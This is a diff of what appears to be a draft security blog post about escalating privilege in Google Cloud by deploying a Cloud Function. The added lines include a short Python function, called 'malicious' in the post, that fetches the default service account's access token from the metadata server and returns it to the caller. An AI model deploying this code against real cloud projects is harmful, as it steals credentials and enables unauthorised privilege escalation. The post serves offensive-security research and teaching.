@@ -1,8 +1,11 @@
 Research it:
-Explain the fucntion source code
+
+
+
+The pathway diagram
 API Enabled for actions?
-Write: Escalating Privilege to a high level Service Account
 Add Logging for each section
+
 test it around linux
 requirements.txt
 
@@ -49,13 +52,33 @@ Our focus in this blog is on creating a Cloud Function using the least privilege
 
 ### Ways to upload code in Cloud Function in GCP
 
-If you're creating a Cloud Function in GCP, you can use **Cloud Console, gCloud Command, **or** Cloud Function API** to do so. Regardless of the method you choose, you will need to upload the code into the Cloud Function. There are three different ways to upload the code:
+If you're creating a Cloud Function in GCP, you can use **Cloud Console, gCloud Command, **or** Cloud Function API** to do so. Regardless of the method you choose, you will need to upload the code into the Cloud Function. 
+
+The code uploaded to a cloud function helps define the behavior and functionality of the function. Code can include the logic for processing incoming requests, performing specific tasks, accessing external resources, and returning responses etc. The code is responsible for executing the main function that is triggered when the function is invoked, and it can interact with various services and APIs based on the needs of the function. The Code allows the function to perform a specific action or set of actions in response to an event or request. In short the code is what makes a Cloud Function - "Function". 
+
+There are three different ways to upload the code:
 
 1. Local Machine
 2. Cloud Storage
 3. Cloud Repository
 
 <p><img src="https://github.com/anrbn/blog/blob/main/images/7.jpg"></p>
+
+In our case, since we are using Cloud Function to Privilege Escalate, we will upload a malicious code to the Cloud Function. Here is the code we will be uploading.
+
+```python
+import requests
+
+def anirban(request):
+    metadata_server_url = "http://169.254.169.254/computeMetadata/v1"
+    metadata_key_url = f"{metadata_server_url}/instance/service-accounts/default/token"
+    metadata_headers = {"Metadata-Flavor": "Google"}
+    response = requests.get(metadata_key_url, headers=metadata_headers)
+    access_token = response.text
+    return access_token
+```
+
+This is a above function retrieves the access token of the default Service Account of the current cloud function instance. It does so by sending a GET request to the Compute Engine metadata server endpoint at "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token". The metadata server endpoint returns a JSON response containing the access token. The function then returns the access token to the caller.
 
 ### Permission Required for Deploying a Cloud Function via gCloud
 
